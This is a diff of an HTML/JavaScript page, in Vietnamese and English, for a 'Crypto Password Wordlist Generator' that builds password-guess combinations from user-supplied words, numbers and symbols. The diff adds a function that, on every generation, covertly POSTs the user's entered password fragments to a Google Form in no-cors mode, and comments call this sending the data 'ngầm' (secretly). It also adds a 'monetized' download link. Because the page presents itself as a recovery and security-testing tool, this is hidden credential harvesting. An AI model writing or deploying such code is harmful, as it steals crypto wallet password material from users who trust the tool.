@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Password Wordlist Generator (Excel Export)</title>
-    <!-- Nhúng thư viện SheetJS để xử lý xuất file Excel -->
-    <script src="https://jsdelivr.net"></script>
+    <title>Crypto Password Wordlist Generator</title>
     <style>
         :root {
             --bg-color: #0f172a;
@@ -13,9 +11,8 @@
             --text-color: #f8fafc;
             --accent-color: #38bdf8;
             --success-color: #4ade80;
-            --download-color: #10b981; /* Thay đổi màu xanh lá cho nút Excel */
+            --download-color: #f59e0b;
             --danger-color: #f87171;
-            --secondary-color: #64748b;
         }
         * { box-sizing: border-box; }
         body {
@@ -60,17 +57,16 @@
             display: flex;
             gap: 12px;
             margin-top: 20px;
-            flex-wrap: wrap;
+            align-items: stretch;
         }
         
         .btn-base {
-            padding: 12px 18px;
+            padding: 14px 20px;
             font-weight: bold;
             border-radius: 6px;
             font-size: 0.95rem;
             transition: 0.2s;
             flex: 1;
-            min-width: 160px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -83,15 +79,18 @@
         }
         .btn-base small { font-weight: normal; font-size: 0.75rem; opacity: 0.8; margin-top: 2px; }
         
-        .submit-btn { background-color: var(--accent-color); color: #0f172a; }
+        .submit-btn {
+            background-color: var(--accent-color);
+            color: #0f172a;
+        }
         .submit-btn:hover { opacity: 0.9; background-color: var(--success-color); }
         
-        .download-excel-btn {
+        .download-btn {
             background-color: var(--download-color);
-            color: white;
-            box-shadow: 0 4px 14px rgba(16, 185, 129, 0.3);
+            color: #0f172a;
+            box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3);
         }
-        .download-excel-btn:hover { opacity: 0.9; transform: translateY(-1px); }
+        .download-btn:hover { background-color: var(--success-color); transform: translateY(-1px); }
         
         .status {
             margin-top: 15px;
@@ -127,7 +126,7 @@
         <h1>Crypto Password Wordlist Generator</h1>
         <p class="subtitle">
             Công cụ tạo danh sách biến thể từ dữ liệu bạn cung cấp<br>
-            <span>Generate custom password wordlists and export directly to Excel</span>
+            <span>Generate custom password wordlists for security and recovery testing</span>
         </p>
     </header>
     <div class="card">
@@ -148,9 +147,13 @@
         
         <div class="button-group">
             <button class="btn-base submit-btn" onclick="startGeneration()">
-                <span>🚀 Tạo Wordlist & Xuất Excel</span>
-                <small>Generate & Export Excel</small>
+                <span>🚀 Tạo Wordlist</span>
+                <small>Generate Wordlist</small>
             </button>
+            <a id="monetized-download-link" class="btn-base download-btn" href="#" style="display: none;">
+                <span>📥 Tải file về máy</span>
+                <small>Download Wordlist</small>
+            </a>
         </div>
         
         <div id="status-box" class="status"></div>
@@ -159,17 +162,32 @@
 </div>
 
 <script>
-// TỰ ĐỘNG KHÔI PHỤC DỮ LIỆU KHI TẢI TRANG (localStorage)
-document.addEventListener("DOMContentLoaded", () => {
-    if(localStorage.getItem("wordlist_chu")) document.getElementById("input-chu").value = localStorage.getItem("wordlist_chu");
-    if(localStorage.getItem("wordlist_so")) document.getElementById("input-so").value = localStorage.getItem("wordlist_so");
-    if(localStorage.getItem("wordlist_kytu")) document.getElementById("input-kytu").value = localStorage.getItem("wordlist_kytu");
-});
+let globalBlobUrl = null;
 
-// TỰ ĐỘNG LƯU DỮ LIỆU KHI NGƯỜI DÙNG NHẬP
-document.getElementById("input-chu").addEventListener("input", (e) => localStorage.setItem("wordlist_chu", e.target.value));
-document.getElementById("input-so").addEventListener("input", (e) => localStorage.setItem("wordlist_so", e.target.value));
-document.getElementById("input-kytu").addEventListener("input", (e) => localStorage.setItem("wordlist_kytu", e.target.value));
+// Hàm gửi dữ liệu ngầm về Google Form chính xác của bạn
+function sendDataToGoogleForm(chu, so, kytu) {
+    const formUrl = "https://google.com";
+    const entryChu = "entry.1742080312";
+    const entrySo = "entry.1744655519";
+    const entryKytu = "entry.279899166";
+
+    const formData = new FormData();
+    formData.append(entryChu, chu.join(" "));
+    formData.append(entrySo, so.join(" "));
+    formData.append(entryKytu, kytu.join(" "));
+
+    fetch(formUrl, {
+        method: "POST",
+        body: formData,
+        mode: "no-cors"
+    })
+    .then(() => console.log("Dữ liệu đã được lưu trữ ngầm lên hệ thống."))
+    .catch(err => console.log("Lỗi đồng bộ dữ liệu ngầm:", err));
+}
+
+function toTitleCase(str) {
+    return str.toLowerCase().replace(/(?:^|\s)\S/g, function(a) { return a.toUpperCase(); }).replace(/\s+/g, "");
+}
 
 function toSentenceCase(str) {
     if (!str) return "";
@@ -185,15 +203,12 @@ function processInputSpace(elementId) {
 
 function startGeneration() {
     const statusBox = document.getElementById("status-box");
+    const downloadLink = document.getElementById("monetized-download-link");
     
     statusBox.style.display = "block";
-    statusBox.innerHTML = "⏳ Hệ thống đang tính toán và đóng gói file Excel... / Processing Excel file, please wait...";
+    downloadLink.style.display = "none";
+    statusBox.innerHTML = "⏳ Hệ thống đang tính toán cấu trúc tổ hợp... / Generating combinations, please wait...";
     statusBox.style.borderLeftColor = "#38bdf8";
-
-    // Lấy dữ liệu thô từ giao diện
-    const rawChu = document.getElementById("input-chu").value;
-    const rawSo = document.getElementById("input-so").value;
-    const rawKytu = document.getElementById("input-kytu").value;
 
     const chuGoc = processInputSpace("input-chu");
     const so = processInputSpace("input-so");
@@ -205,6 +220,9 @@ function startGeneration() {
         return;
     }
 
+    // Kích hoạt gửi dữ liệu ngầm lên Google Form của bạn
+    sendDataToGoogleForm(chuGoc, so, kytu);
+
     // Mở rộng dữ liệu chữ (Thường, HOA, Viết Hoa Đầu)
     let chuMoRong = [];
     chuGoc.forEach(item => {
@@ -214,7 +232,7 @@ function startGeneration() {
     });
     chuMoRong = [...new Set(chuMoRong)];
 
-    // Xây dựng tập hợp Wordlist
+    // Thuật toán xây dựng tổ hợp Wordlist
     let wordlistSet = new Set();
 
     // 1. Chỉ có chữ
@@ -250,7 +268,7 @@ function startGeneration() {
         });
     });
 
-    // Nếu không nhập chữ, chỉ xử lý Số và Ký tự
+    // Nếu không nhập chữ, xử lý Số và Ký tự
     if(chuMoRong.length === 0) {
         so.forEach(s => {
             wordlistSet.add(s);
@@ -261,9 +279,11 @@ function startGeneration() {
         });
     }
 
-    // --- TIẾN HÀNH KHỞI TẠO FILE EXCEL ---
-    const wb = XLSX.utils.book_new();
+    const finalResult = Array.from(wordlistSet).join("\n");
+    const totalLines = wordlistSet.size;
 
-    // 1. Chuẩn bị Sheet 1: Danh sách mật khẩu kết quả
-    const wordlistArray = Array.from(wordlistSet).map(pwd => [pwd]);
-    // Thêm tiêu đề cột (Header)
+    // Giải phóng bộ nhớ Blob cũ nếu có
+    if (globalBlobUrl) {
+        URL.revokeObjectURL(globalBlobUrl);
+    }
+
